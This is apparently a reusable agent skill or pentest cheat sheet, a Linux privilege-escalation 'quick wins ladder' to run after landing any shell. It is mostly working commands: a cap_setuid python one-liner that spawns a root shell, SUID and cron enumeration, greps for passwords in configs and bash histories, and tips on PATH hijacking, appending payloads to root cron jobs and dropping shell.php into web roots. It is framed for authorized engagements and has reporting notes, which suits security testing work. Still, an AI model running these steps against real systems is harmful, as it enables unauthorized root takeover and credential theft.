---
name: linux-privesc-quickwins
description: Use after Linux shell. Quick privesc ladder - caps to root.
---

# Linux Privesc - Quick Wins Ladder (reusable)

Ordered cheapest-first after landing ANY Linux shell. Authorized engagements
only. Run the WHOLE ladder before deep-diving any single vector - quick wins
land within minutes on most lab and misconfigured production boxes.

## Ladder (run top to bottom)
```bash
# 1. Who/sudo basics
id && sudo -n -l 2>/dev/null; sudo -l 2>/dev/null

# 2. Capabilities (instant root on interpreters - check FIRST)
getcap -r / 2>/dev/null | grep -v 'docker\|proc'
#   cap_setuid on python/perl/php -> immediate root -
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# 3. SUID binaries
find / -perm -4000 -type f 2>/dev/null | xargs ls -la 2>/dev/null
#   compare found set against GTFOBins

# 4. Cron / systemd timers
cat /etc/crontab; ls -la /etc/cron*; systemctl list-timers --all
#   writable scripts run by root = append payload

# 5. Writable root-run paths
find / -writable -type d 2>/dev/null | grep -vE 'proc|sys|tmp|dev'
#   PATH hijack - root cron runs unqualified binary name you can shadow

# 6. Secrets in configs/history
grep -riE 'pass(wd|word)?' /opt /srv /home --include='*.php' \
  --include='*.py' --include='*.conf' --include='*.env' -l 2>/dev/null
cat ~/.bash_history /home/*/.bash_history 2>/dev/null | grep -iE 'pass|ssh|su '
find / -name '*.env' -o -name '*config*.php' 2>/dev/null | head

# 7. Internal services (root-run web/dev services = file-write primitives)
ss -tlnp 2>/dev/null || netstat -tlnp
#   dev servers (php -S, python http.server) as root + writable docroot = RCE

# 8. Kernel/other
uname -a; ls /opt /srv /var/backups 2>/dev/null
```

## Highest-yield patterns (seen repeatedly in the wild)
- **cap_setuid on an interpreter** - check before anything else - one-liner
  root, commonly missed because it is not SUID.
- **Root-run dev/file servers** - if root runs a service that writes files
  from user input (export/save endpoints), you control filename+content ->
  write into web root (`shell.php`), cron dirs, or overwrite root helpers.
- **Cleartext creds in app configs** -> `su other-user` -> that user holds
  the sudo rights you actually need.
- **sudo -l wildcards** (`NOPASSWD: /usr/bin/python3*`) -> GTFOBins one-liner.

## Reporting notes
- Document the exact one-liner used as PoC; disable the vector after proof
  unless the engagement owns the box.
